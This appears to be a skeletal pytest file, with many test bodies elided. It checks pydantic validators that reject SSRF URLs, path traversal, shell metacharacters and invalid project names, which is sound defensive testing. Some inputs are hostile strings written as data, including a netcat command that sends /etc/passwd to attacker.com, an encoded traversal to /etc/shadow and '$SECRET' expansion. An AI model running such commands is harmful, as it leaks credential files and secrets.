...
class TestSafeUrl:
    ...
    def test_security_types_valid_public_url_passes_passes_validation(self) -> None:
    ...
    def test_security_types_loopback_url_raises_validation_error_validationerror_ssrf(
        self,
    ) -> None:
    ...
    def test_security_types_private_ip_url_raises_validation_error_validationerror_ssrf(
        self,
    ) -> None:
    ...
    def test_security_types_metadata_endpoint_raises_validation_error_validationerror_ssrf(
        self,
    ) -> None:
    ...
    def test_security_types_invalid_scheme_raises_validation_error_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_empty_string_raises_validation_error_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_no_domain_raises_validation_error_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_link_local_address_raises_validation_error_validationerror_ssrf(
        self,
    ) -> None:
    ...
    def test_security_types_safe_url_returns_guarded_value_the_guard(
        self,
    ) -> None:
...
class TestSafePath:
    ...
    def test_security_types_simple_path_passes_passes_validation(self) -> None:
        """A path without traversal markers passes validation."""
        m = PathModel(path="uploads/image.png")
        assert m.path == "uploads/image.png"

    def test_security_types_path_traversal_dotdot_raises_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_encoded_traversal_raises_raises_validationerror(self) -> None:
        """URL-encoded path traversal raises ValidationError."""
        with pytest.raises(ValidationError):
            PathModel(path="%2e%2e/etc/shadow")

    def test_security_types_tilde_traversal_raises_raises_validationerror(self) -> None:
        """Tilde in path raises ValidationError."""
        with pytest.raises(ValidationError):
            PathModel(path="~/secrets")

    def test_security_types_absolute_path_in_base_passes_passes_validation(
        self,
    ) -> None:
...
class TestSafeCommand:
    ...
    def test_security_types_simple_command_passes_passes_validation(self) -> None:
        """A benign command string passes validation."""
        m = CommandModel(command="ls")
        assert m.command == "ls"

    def test_security_types_command_with_semicolon_raises_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_command_with_pipe_raises_raises_validationerror(self) -> None:
        """Command containing pipe raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="cat /etc/passwd | nc attacker.com 80")

    def test_security_types_command_with_dollar_raises_raises_validationerror(self) -> None:
        """Command containing variable expansion raises ValidationError."""
        with pytest.raises(ValidationError):
            CommandModel(command="echo $SECRET")

    def test_security_types_command_with_backtick_raises_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_command_with_ampersand_raises_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_command_with_redirect_raises_raises_validationerror(
        self,
    ) -> None:
...
class TestSafeProjectName:
    ...
    def test_security_types_valid_name_passes_passes_validation(self) -> None:
        """A valid project name passes validation."""
        m = ProjectModel(name="my_project")
        assert m.name == "my_project"

    def test_security_types_valid_name_with_hyphens_passes_passes_validation(
        self,
    ) -> None:
    ...
    def test_security_types_empty_name_raises_raises_validationerror(self) -> None:
    ...
    def test_security_types_name_starting_with_digit_raises_raises_validationerror(
        self,
    ) -> None:
    ...
    def test_security_types_reserved_name_raises_raises_validationerror(self) -> None:
        """Reserved project name raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="test")

    def test_security_types_name_with_spaces_raises_raises_validationerror(self) -> None:
        """Project name containing spaces raises ValidationError."""
        with pytest.raises(ValidationError):
            ProjectModel(name="my project")

    def test_security_types_name_too_long_raises_raises_validationerror(self) -> None:
...
def test_security_types_safe_url_err_branch_expected() -> None:
    import pytest
    from pydantic import BaseModel, ValidationError
